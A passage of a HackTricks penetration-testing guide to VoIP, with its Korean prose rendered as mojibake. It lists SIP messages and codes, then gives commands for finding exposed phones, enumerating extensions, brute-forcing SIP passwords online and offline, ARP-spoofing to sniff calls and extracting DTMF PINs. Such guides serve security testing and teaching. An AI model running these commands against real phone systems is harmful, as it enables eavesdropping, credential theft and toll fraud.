# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP ê¸°ë³¸ ì •ë³´

VoIP ì‘ë™ ë°©ì‹ì— ëŒ€í•´ ë°°ìš°ë ¤ë©´ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## ê¸°ë³¸ ë©”ì‹œì§€
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xxâ€”ì„ì‹œ ì‘ë‹µ**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”ì„±ê³µì ì¸ ì‘ë‹µ**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”ë¦¬ë””ë ‰ì…˜ ì‘ë‹µ**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”í´ë¼ì´ì–¸íŠ¸ ì‹¤íŒ¨ ì‘ë‹µ**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”ì„œë²„ ì‹¤íŒ¨ ì‘ë‹µ**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”ì „ì—­ ì‹¤íŒ¨ ì‘ë‹µ**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telephone Numbers

Red Teamì´ í•  ìˆ˜ ìˆëŠ” ì²« ë²ˆì§¸ ë‹¨ê³„ ì¤‘ í•˜ë‚˜ëŠ” OSINT ë„êµ¬, Google ê²€ìƒ‰ ë˜ëŠ” ì›¹ í˜ì´ì§€ ìŠ¤í¬ë˜í•‘ì„ ì‚¬ìš©í•˜ì—¬ íšŒì‚¬ì— ì—°ë½í•  ìˆ˜ ìˆëŠ” ì „í™”ë²ˆí˜¸ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì „í™”ë²ˆí˜¸ë¥¼ í™•ë³´í•œ í›„ì—ëŠ” ì˜¨ë¼ì¸ ì„œë¹„ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš´ì˜ìë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ìš´ì˜ìê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ íšŒì‚¬ê°€ VoIPë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ”ì§€ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤... ê²Œë‹¤ê°€, íšŒì‚¬ê°€ VoIP ì„œë¹„ìŠ¤ë¥¼ ê³„ì•½í•˜ì§€ ì•Šì•˜ì§€ë§Œ PSTN ì¹´ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ìì²´ VoIP PBXë¥¼ ì „í†µì ì¸ ì „í™” ë„¤íŠ¸ì›Œí¬ì— ì—°ê²°í•˜ê³  ìˆì„ ê°€ëŠ¥ì„±ë„ ìˆìŠµë‹ˆë‹¤.

ìŒì•…ì˜ ìë™ ì‘ë‹µê³¼ ê°™ì€ ê²ƒë“¤ì€ ì¼ë°˜ì ìœ¼ë¡œ VoIPê°€ ì‚¬ìš©ë˜ê³  ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT ì •ë³´

VoIP ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” ë‹¤ë¥¸ OSINT ì—´ê±°ëŠ” Red Teamì— ìœ ìš©í•  ê²ƒì…ë‹ˆë‹¤.

### ë„¤íŠ¸ì›Œí¬ ì—´ê±°

* **`nmap`**ì€ UDP ì„œë¹„ìŠ¤ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆì§€ë§Œ, ìŠ¤ìº”ë˜ëŠ” UDP ì„œë¹„ìŠ¤ì˜ ìˆ˜ ë•Œë¬¸ì— ë§¤ìš° ëŠë¦¬ê³  ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì„œë¹„ìŠ¤ì— ëŒ€í•´ ì •í™•í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** from SIPVicious (`sudo apt install sipvicious`): ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ì—ì„œ SIP ì„œë¹„ìŠ¤ë¥¼ ì°¾ìŠµë‹ˆë‹¤.
* `svmap`ì€ User-Agent `friendly-scanner`ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— **ì°¨ë‹¨í•˜ê¸° ì‰½ìŠµë‹ˆë‹¤**, í•˜ì§€ë§Œ `/usr/share/sipvicious/sipvicious`ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ì—¬ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS ìŠ¤ìº”`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS ìŠ¤ìº”ì€ UDP, TCP ë˜ëŠ” TLSë¥¼ í†µí•œ SIP ì„œë¹„ìŠ¤ì— ëŒ€í•œ ë§¤ìš° ë¹ ë¥¸ ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ë©€í‹°ìŠ¤ë ˆë“œë¥¼ ì‚¬ìš©í•˜ë©° ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë²”ìœ„ë¥¼ ìŠ¤ìº”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í¬íŠ¸ ë²”ìœ„ë¥¼ ì‰½ê²Œ ì§€ì •í•˜ê³ , TCPì™€ UDPë¥¼ ëª¨ë‘ ìŠ¤ìº”í•˜ë©°, ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê³ (ê¸°ë³¸ì ìœ¼ë¡œ OPTIONSë¥¼ ì‚¬ìš©), ë‹¤ë¥¸ User-Agentë¥¼ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê¸°íƒ€ ë“±ë“±).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

PBXëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë‹¤ë¥¸ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **69/UDP (TFTP)**: íŒì›¨ì–´ ì—…ë°ì´íŠ¸
* **80 (HTTP) / 443 (HTTPS)**: ì›¹ì—ì„œ ì¥ì¹˜ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´
* **389 (LDAP)**: ì‚¬ìš©ì ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” ëŒ€ì•ˆ
* **3306 (MySQL)**: MySQL ë°ì´í„°ë² ì´ìŠ¤
* **5038 (Manager)**: ë‹¤ë¥¸ í”Œë«í¼ì—ì„œ Asteriskë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•¨
* **5222 (XMPP)**: Jabberë¥¼ ì‚¬ìš©í•œ ë©”ì‹œì§€
* **5432 (PostgreSQL)**: PostgreSQL ë°ì´í„°ë² ì´ìŠ¤
* ê¸°íƒ€...

### Methods Enumeration

PBXì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” **ë©”ì„œë“œ**ë¥¼ ì°¾ëŠ” ê²ƒì€ `SIPPTS enumerate`ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ëŠ¥í•©ë‹ˆë‹¤ [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### ì„œë²„ ì‘ë‹µ ë¶„ì„

ì„œë²„ê°€ ìš°ë¦¬ì—ê²Œ ë³´ë‚´ëŠ” í—¤ë”ë¥¼ ë¶„ì„í•˜ëŠ” ê²ƒì€ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŠ” ìš°ë¦¬ê°€ ë³´ë‚´ëŠ” ë©”ì‹œì§€ì™€ í—¤ë”ì˜ ìœ í˜•ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤. [**sippts**](https://github.com/Pepelux/sippts)ì˜ `SIPPTS send`ë¥¼ ì‚¬ìš©í•˜ë©´ ëª¨ë“  í—¤ë”ë¥¼ ì¡°ì‘í•˜ì—¬ ê°œì¸í™”ëœ ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°, ì‘ë‹µì„ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
ì„œë²„ê°€ ì›¹ì†Œì¼“ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ë°ì´í„°ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. [**sippts**](https://github.com/Pepelux/sippts)ì˜ `SIPPTS wssend`ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°œì¸í™”ëœ WS ë©”ì‹œì§€ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX(Private Branch Exchange) ì‹œìŠ¤í…œì—ì„œ í™•ì¥ì€ **ì¡°ì§ì´ë‚˜ ë¹„ì¦ˆë‹ˆìŠ¤ ë‚´ì˜ ê°œë³„** ì „í™”ì„ , ì¥ì¹˜ ë˜ëŠ” ì‚¬ìš©ìì—ê²Œ í• ë‹¹ëœ **ê³ ìœ í•œ ë‚´ë¶€ ì‹ë³„ì**ë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤. í™•ì¥ì€ **ì¡°ì§ ë‚´ì—ì„œ ì „í™”ë¥¼ íš¨ìœ¨ì ìœ¼ë¡œ ë¼ìš°íŒ…**í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ê° ì‚¬ìš©ìë‚˜ ì¥ì¹˜ì— ëŒ€í•œ ê°œë³„ ì™¸ë¶€ ì „í™”ë²ˆí˜¸ê°€ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`ëŠ” ë¬´ë£Œ SIP PBX í™•ì¥ì„  ìŠ¤ìºë„ˆì…ë‹ˆë‹¤. ê°œë…ì ìœ¼ë¡œ ì „í†µì ì¸ ì›Œë“œë‹¤ì´ì–¼ëŸ¬ì™€ ìœ ì‚¬í•˜ê²Œ **í™•ì¥ ë²”ìœ„ ë˜ëŠ” ì£¼ì–´ì§„ í™•ì¥ ëª©ë¡ì„ ì¶”ì¸¡**í•˜ì—¬ ì‘ë™í•©ë‹ˆë‹¤.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS extenì€ SIP ì„œë²„ì—ì„œ í™•ì¥ì„ ì‹ë³„í•©ë‹ˆë‹¤. Sipextenì€ ëŒ€ê·œëª¨ ë„¤íŠ¸ì›Œí¬ ë° í¬íŠ¸ ë²”ìœ„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: metasploitì„ ì‚¬ìš©í•˜ì—¬ í™•ì¥/ì‚¬ìš©ì ì´ë¦„ì„ ì—´ê±°í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**ëŠ” Inter Asterisk Exchange í”„ë¡œí† ì½œ **ì‚¬ìš©ì ì´ë¦„ ë¬´ì°¨ë³„ ëŒ€ì… ì—´ê±°ê¸°**ì…ë‹ˆë‹¤. enumIAXëŠ” ë‘ ê°€ì§€ ëª¨ë“œì—ì„œ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤; ìˆœì°¨ì  ì‚¬ìš©ì ì´ë¦„ ì¶”ì¸¡ ë˜ëŠ” ì‚¬ì „ ê³µê²©.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP ê³µê²©

### ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì… - ì˜¨ë¼ì¸

**PBX**ì™€ ì¼ë¶€ **í™•ì¥/ì‚¬ìš©ì ì´ë¦„**ì„ ë°œê²¬í•œ í›„, Red Teamì€ ì¼ë°˜ ë¹„ë°€ë²ˆí˜¸ ì‚¬ì „ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ê¸° ìœ„í•´ **`REGISTER` ë°©ë²•**ì„ í†µí•´ í™•ì¥ì— ì¸ì¦ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ì‚¬ìš©ì ì´ë¦„**ì´ í™•ì¥ê³¼ ë™ì¼í•  ìˆ˜ ìˆì§€ë§Œ, ì´ ê´€í–‰ì€ PBX ì‹œìŠ¤í…œ, êµ¬ì„± ë° ì¡°ì§ì˜ ì„ í˜¸ë„ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤...

ì‚¬ìš©ì ì´ë¦„ì´ í™•ì¥ê³¼ ë™ì¼í•˜ì§€ ì•Šì€ ê²½ìš°, **ë¬´ì°¨ë³„ ëŒ€ì…ì„ ìœ„í•´ ì‚¬ìš©ì ì´ë¦„ì„ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤**.
{% endhint %}

* **`svcrack`** from SIPVicious (`sudo apt install sipvicious`): SVCrackì€ PBXì—ì„œ íŠ¹ì • ì‚¬ìš©ì ì´ë¦„/í™•ì¥ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í•´ë…í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrackì€ SIP ì„œë¹„ìŠ¤ìš© ì›ê²© ë¹„ë°€ë²ˆí˜¸ í¬ë˜ì»¤ì…ë‹ˆë‹¤. Rcrackì€ ì—¬ëŸ¬ ì‚¬ìš©ìì— ëŒ€í•´ ë‹¤ì–‘í•œ IP ë° í¬íŠ¸ ë²”ìœ„ì—ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP ìŠ¤ë‹ˆí•‘

**Open Wifi ë„¤íŠ¸ì›Œí¬** ë‚´ì—ì„œ VoIP ì¥ë¹„ë¥¼ ë°œê²¬í•˜ë©´ **ëª¨ë“  ì •ë³´ë¥¼ ìŠ¤ë‹ˆí•‘**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ë” íì‡„ëœ ë„¤íŠ¸ì›Œí¬(ì´ë”ë„· ë˜ëŠ” ë³´í˜¸ëœ Wifië¥¼ í†µí•´ ì—°ê²°ëœ ê²½ìš°) ë‚´ì—ì„œëŠ” **PBXì™€ ê²Œì´íŠ¸ì›¨ì´** ê°„ì— **MitM ê³µê²©**ì¸ [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)ì„ ìˆ˜í–‰í•˜ì—¬ ì •ë³´ë¥¼ ìŠ¤ë‹ˆí•‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë„¤íŠ¸ì›Œí¬ ì •ë³´ ì¤‘ì—ëŠ” ì¥ë¹„ë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•œ **ì›¹ ìê²© ì¦ëª…**, ì‚¬ìš©ì **ë‚´ì„ **, **ì‚¬ìš©ì ì´ë¦„**, **IP** ì£¼ì†Œ, ì‹¬ì§€ì–´ **í•´ì‹œëœ ë¹„ë°€ë²ˆí˜¸**ì™€ **RTP íŒ¨í‚·**ì´ í¬í•¨ë˜ì–´ ìˆì–´ **ëŒ€í™”ë¥¼ ë“¤ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤.

ì´ ì •ë³´ë¥¼ ì–»ê¸° ìœ„í•´ Wireshark, tcpdumpì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆì§€ë§Œ, **VoIP ëŒ€í™”ë¥¼ ìŠ¤ë‹ˆí•‘í•˜ê¸° ìœ„í•´ íŠ¹ë³„íˆ ì œì‘ëœ ë„êµ¬ëŠ”** [**ucsniff**](https://github.com/Seabreg/ucsniff)ì…ë‹ˆë‹¤.

{% hint style="danger" %}
**SIP í†µì‹ ì— TLSê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°** SIP í†µì‹ ì„ ëª…í™•í•˜ê²Œ ë³¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.\
**SRTP** ë° **ZRTP**ê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°ì—ë„ **RTP íŒ¨í‚·ì€ í‰ë¬¸ì´ ì•„ë‹™ë‹ˆë‹¤**.
{% endhint %}

#### SIP ìê²© ì¦ëª… (ë¹„ë°€ë²ˆí˜¸ ë¸Œë£¨íŠ¸í¬ìŠ¤ - ì˜¤í”„ë¼ì¸)

[**SIP REGISTER í†µì‹ **ì„ ë” ì˜ ì´í•´í•˜ê¸° ìœ„í•œ ì´ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) **ìê²© ì¦ëª…ì´ ì–´ë–»ê²Œ ì „ì†¡ë˜ëŠ”ì§€** ë°°ìš°ê¸° ìœ„í•´.

* **`sipdump`** & **`sipcrack`,** **sipcrack**ì˜ ì¼ë¶€(`apt-get install sipcrack`): ì´ ë„êµ¬ë“¤ì€ **pcap**ì—ì„œ SIP í”„ë¡œí† ì½œ ë‚´ì˜ **ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦**ì„ **ì¶”ì¶œ**í•˜ê³  **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS ë¤í”„ëŠ” pcap íŒŒì¼ì—ì„œ ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦ì„ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrackì€ SIPPTS ë¤í”„ì—ì„œ ì–»ì€ ë‹¤ì´ì œìŠ¤íŠ¸ ì¸ì¦ì„ í¬ë™í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tsharkëŠ” PCAP íŒŒì¼ì—ì„œ SIP í”„ë¡œí† ì½œì˜ ë°ì´í„°ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF ì½”ë“œ

**SIP ìê²© ì¦ëª…**ë¿ë§Œ ì•„ë‹ˆë¼ ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì—ì„œ **ìŒì„± ë©”ì¼**ì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” DTMF ì½”ë“œë¥¼ ì°¾ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.\
ì´ ì½”ë“œëŠ” **INFO SIP ë©”ì‹œì§€**, **ì˜¤ë””ì˜¤** ë˜ëŠ” **RTP íŒ¨í‚·** ë‚´ì—ì„œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. RTP íŒ¨í‚· ë‚´ì— ì½”ë“œê°€ ìˆëŠ” ê²½ìš°, ëŒ€í™”ì˜ í•´ë‹¹ ë¶€ë¶„ì„ ì˜ë¼ë‚´ê³  multimo ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
multimon -a DTMF -t wac pin.wav
```
### ë¬´ë£Œ í†µí™” / Asterisks ì—°ê²° ì˜ëª» êµ¬ì„±

Asteriskì—ì„œëŠ” **íŠ¹ì • IP ì£¼ì†Œ**ì—ì„œì˜ ì—°ê²° ë˜ëŠ” **ëª¨ë“  IP ì£¼ì†Œ**ì—ì„œì˜ ì—°ê²°ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
host=10.10.10.10
host=dynamic
```
If an IP address is specified, the host **REGISTER** ìš”ì²­ì„ ì£¼ê¸°ì ìœ¼ë¡œ ë³´ë‚¼ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤ (REGISTER íŒ¨í‚·ì—ëŠ” ì¼ë°˜ì ìœ¼ë¡œ 30ë¶„ì¸ ìƒì¡´ ì‹œê°„ì´ í¬í•¨ë˜ì–´ ìˆì–´, ë‹¤ë¥¸ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì „í™”ê°€ 30ë¶„ë§ˆë‹¤ REGISTERë¥¼ í•´ì•¼ í•©ë‹ˆë‹¤). ê·¸ëŸ¬ë‚˜ VoIP ì„œë²„ì—ì„œ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆë„ë¡ ì—°ê²°ì„ í—ˆìš©í•˜ëŠ” ì—´ë¦° í¬íŠ¸ê°€ í•„ìš”í•©ë‹ˆë‹¤.

ì‚¬ìš©ìë¥¼ ì •ì˜í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`type=user`**: ì‚¬ìš©ìëŠ” ì‚¬ìš©ìë¡œì„œë§Œ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`type=friend`**: í”¼ì–´ë¡œ ì „í™”ë¥¼ ê±¸ê³  ì‚¬ìš©ìë¡œì„œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í™•ì¥ê³¼ í•¨ê»˜ ì‚¬ìš©ë¨)
* **`type=peer`**: í”¼ì–´ë¡œ ì „í™”ë¥¼ ë³´ë‚´ê³  ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (SIP-trunks)

ì‹ ë¢°ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:

* **`insecure=port`**: IPë¡œ ê²€ì¦ëœ í”¼ì–´ ì—°ê²°ì„ í—ˆìš©í•©ë‹ˆë‹¤.
* **`insecure=invite`**: INVITE ë©”ì‹œì§€ì— ëŒ€í•œ ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **`insecure=port,invite`**: ë‘˜ ë‹¤

{% hint style="warning" %}
